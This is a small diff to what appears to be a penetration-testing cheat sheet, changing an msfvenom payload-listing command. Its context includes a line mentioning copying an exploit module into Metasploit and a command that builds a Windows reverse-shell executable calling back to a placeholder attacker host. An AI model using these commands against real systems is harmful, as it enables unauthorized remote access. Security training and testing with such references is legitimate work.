@@ -513,7 +513,7 @@ cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/pa
 MSFVENOM
 --------
 # list available payloads
-msfvenom --list
+msfvenom --list payloads
 
 # create Windows TCP reverse shell exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
